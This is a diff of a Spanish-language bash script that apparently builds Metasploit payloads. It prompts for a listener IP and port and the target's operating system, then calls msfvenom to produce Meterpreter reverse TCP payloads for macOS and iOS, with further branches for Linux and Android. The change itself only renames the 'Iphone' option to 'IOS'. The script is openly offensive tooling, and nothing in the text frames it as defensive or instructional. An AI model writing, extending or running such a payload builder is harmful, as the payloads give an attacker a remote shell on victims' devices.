@@ -25,7 +25,7 @@ read IP
 echo "Introduce el puerto de escucha: "
 read port
 
-echo "¿Qué sistema operativo tiene el dispositivo objetivo? (Windows | GNU/Linux | MacOS | Iphone | Android): "
+echo "¿Qué sistema operativo tiene el dispositivo objetivo? (Windows | GNU/Linux | MacOS | IOS | Android): "
 read hack
 
 # Validación del sistema operativo (Mensaje corregido)
@@ -48,7 +48,7 @@ elif [[ "$hack" =~ ^(Linux|linux)$ ]]; then
 elif [[ "$hack" =~ ^(Mac|MacOS|mac|macos)$ ]]; then
     msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$port -f macho -o payload_mac.macho
 
-elif [[ "$hack" =~ ^(Iphone|iphone)$ ]]; then
+elif [[ "$hack" =~ ^(IOS|ios)$ ]]; then
     msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$IP LPORT=$port -f macho -o payload_iphone.macho
     
 elif [[ "$hack" =~ ^(Android|android)$ ]]; then
